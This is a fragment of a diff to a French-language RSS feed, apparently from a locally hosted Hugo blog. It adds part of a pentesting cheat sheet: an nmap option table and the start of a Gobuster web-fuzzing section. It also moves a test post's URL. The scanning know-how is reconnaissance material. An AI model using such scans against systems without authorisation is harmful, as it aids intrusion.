+          &lt;td style=&#34;text-align: left&#34;&gt;Raccourci pour : &lt;code&gt;-sV -sC -O --traceroute&lt;/code&gt;&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;&lt;code&gt;--max-retries&lt;/code&gt;&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Limite d&amp;rsquo;essais&lt;/td&gt;
+          &lt;td style=&#34;text-align: left&#34;&gt;Réduire pour accélérer sur réseau instable&lt;/td&gt;
+      &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;web-fuzzing&#34;&gt;Web Fuzzing&lt;/h2&gt;
+&lt;h3 id=&#34;gobuster&#34;&gt;Gobuster&lt;/h3&gt;
+&lt;p&gt;exploration de contenu&lt;/p&gt;</description>
+    </item>
     <item>
       <title>Test</title>
-      <link>http://localhost:1313/posts/test/</link>
+      <link>http://localhost:1313/shingsi/autres/test/</link>
       <pubDate>Thu, 02 Apr 2026 10:25:15 +0200</pubDate>
-      <guid>http://localhost:1313/posts/test/</guid>
+      <guid>http://localhost:1313/shingsi/autres/test/</guid>
       <description>&lt;h2 id=&#34;introduction&#34;&gt;Introduction&lt;/h2&gt;
 &lt;p&gt;coucou&lt;/p&gt;</description>
     </item>
